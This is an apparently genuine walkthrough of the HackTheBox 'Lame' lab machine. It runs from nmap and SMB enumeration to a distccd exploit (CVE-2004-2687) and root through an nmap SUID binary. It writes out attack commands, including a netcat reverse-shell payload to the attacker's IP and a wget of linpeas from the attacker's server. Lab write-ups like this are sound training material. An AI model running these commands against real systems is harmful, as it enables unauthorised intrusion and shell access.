# Lame - 10.10.10.3
### Don't forget to check out the Lame.pdf file. To see it in color :)

![Lame_info_card](https://user-images.githubusercontent.com/110210595/187806371-c87c74bd-6111-458a-8cd7-62a899083d09.png)

Started off with a nmap scan `nmap -Pn -T5 -sV -sC -A -p- -oN lame_nmap.txt 10.10.10.3`<br>
While that was scanning I went to go check out to see if the website is up. But I don't get anything back and you'll see why when the results are done.
We get back some nice info to start us off.
Port 80 isn't open so there was no site for me to check.<br>
But there was other ports open such as port 21 with the version number of <em><strong>vsftpd 2.3.4</em></strong> (This version of vsftpd is vulnerable to backdoor command executionCVE-2011-2523) I couldn't get it to work though. So I moved on. If you can't get something to work, don't spend to much time on it. Look at the next route you can take and if you get stuck.<br>
again then go back and try to repeat your steps to make sure you didn't make a typo somewhere.

![nmap_scan_pt1](https://user-images.githubusercontent.com/110210595/186279936-8afa6919-9add-4034-bbe4-2829a8d84580.png)

![nmap_scan_pt2](https://user-images.githubusercontent.com/110210595/186279953-2fb886f4-5574-4cb1-b27b-306826c0b9ca.png)

I see that smb is open. 139/445. I run `smbmap -H 10.10.10` and get back some users.

![smbmap_results](https://user-images.githubusercontent.com/110210595/185814007-319d68bc-004b-4242-b3e0-a943b4eda8e9.png)

we can see that tmp is <em><strong>READ, WRITE</em></strong>. Lets login and see what we can find.<br>
I use `smbclient \\\\10.10.10.3\\tmp` and we get a hit.<br>
I use `ls` to see what we can find. Unfortunately there is nothing here either.<br>
We could use put and get files here but there is no port 80 open for us to execute the files to gain a shell from here. Some bad luck but we got more info so lets keep looking.

![smbclient\tmp_results](https://user-images.githubusercontent.com/110210595/186279990-d0c780e7-424c-43e0-b62f-eea7d5ccf836.png)

I go back to the nmap results and see port 3632 is open and it gave us the version of application running. <em><strong>distccd v1</em></strong><br>
I go to google and search for "<em><strong>distccd v1 exploit</em></strong>" first link brings us to https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855<br>
after reading the exploit it seems to generate a random alpha numeric string. Reads the string. And looks for the trigger exploit which is <em><strong>command, host, port</em></strong><br>
If it is able to connect to the host it will send the payload and hopefully give us a reverse shell.

Let's give it a try. I started by copying the code and writing it to a file naming it CVE-2004-2687.py, did  `chmod +x CVE-2004-2687.py`<br>
the file is ready to be used. First I started a listener on my attacking machine with `nc -lvnp 9001` and then used the following command<br>
`./CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh"` No good, got errors.<br>
Then I tried. `python3 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh"` I got a connected to remote service Ok but then the
socket timed out instantly killing the connection. I went back to the exploit and read the comments, it mentioned that python3 is to new.
So I was going to work my way down from python3 to python.<br>
Next up,  `python2 CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.10 9001 -e /bin/sh"` Success, we get a shell!

![proof_of_user_shell](https://user-images.githubusercontent.com/110210595/186280044-7ad463f8-0082-4d42-9e21-3e0b734cc0ed.png)

![COWABUNGA](https://user-images.githubusercontent.com/110210595/186280016-5a9d0378-3c30-4f95-89e0-c68eea7c86d1.png)

Let's upgrade the shell. I used the following.<br>
`python -c 'import pty; pty.spawn("/bin/bash")'` python3 and python2 didn't work.<br>
`export TERM=xterm `<br>
`stty raw -echo && fg`<br>
`enter`<br>
`enter`<br>

We're a normal user daemon. I started off with `sudo -l` but it asked for a password. Let's move on.
I look around a bit and `cd /home` directory and do a `ls` and see what's there. Nothing good in the user directory but I did go into makis and find the <em><strong>user.txt</em></strong> file. I use <em><strong>cat user.txt</em></strong> at it and we get out our first flag.

![user_txt](https://user-images.githubusercontent.com/110210595/186280050-4c2d9a7e-9b61-4b18-9d51-f14d3659c34f.png)

![Mikey_being_a_savage](https://user-images.githubusercontent.com/110210595/186280056-9b22e873-4987-4845-8417-ec2a8581c9ab.png)

Next, let's head over to the tmp directory and try to transfer over some enumeration files like linpeas.sh<br>
I go to my attacking machine on my transfers directory where I store all my enumeration files, scripts, images, anything that can be used to help us get an edge on the victim machine.<br>
I use `python3 -m http.server 80` to get the server up and running.<br>
On the victim machine ill be in the <em><strong>/tmp</em></strong> directory and use 'wget://10.10.14.10/linpeas.sh' which is my attacking machines ip from HackTheBox. 
The file gets transferred over no problem. I use `chmod +x linpeas.sh` making it an executable file.<br>
I use `./linpeas.sh` and it runs no problem. We get back a lot of results. Several vulnerabilities, but one in particular catches my eye with the yellow red highlight.

![exploit_suggester_results_pt-1](https://user-images.githubusercontent.com/110210595/186280090-9325ff31-2274-4c8b-a279-f6133ef3a11b.png)

![exploit_suggester_results_pt-2](https://user-images.githubusercontent.com/110210595/186280109-1ba8b1b6-6a8c-43ec-87f5-d5e0b7eac263.png)

![exploit_suggester_results_pt-3](https://user-images.githubusercontent.com/110210595/186280119-1ee8d359-4e1a-4a25-8040-728189330987.png)

<em><strong>/usr/bin/nmap suid</em></strong><br>
I head over to https://gtfobins.github.io/ and search for <em><strong>nmap</em></strong><br>
I 'cd /usr/bin' where the suid is located.<br>
I start off with shell code (a) and nothing happened. So I keep going down the list.<br>
Shell (b) worked!

![gtfo_bin_exploit](https://user-images.githubusercontent.com/110210595/186280127-2e9c0379-cf61-4a2b-960e-fdb45b73c42a.png)

we can now 'cd /root' and see what is there which is the <em><strong>root.txt</em></strong>flag!<br>
we have successfully rooted this box!

![root.txt](https://user-images.githubusercontent.com/110210595/186280195-f349b931-70e6-47ae-ba72-77eb1769c8f0.png)

https://user-images.githubusercontent.com/110210595/187824599-0061a62c-4855-4f82-826b-31f863f9a6b4.MOV
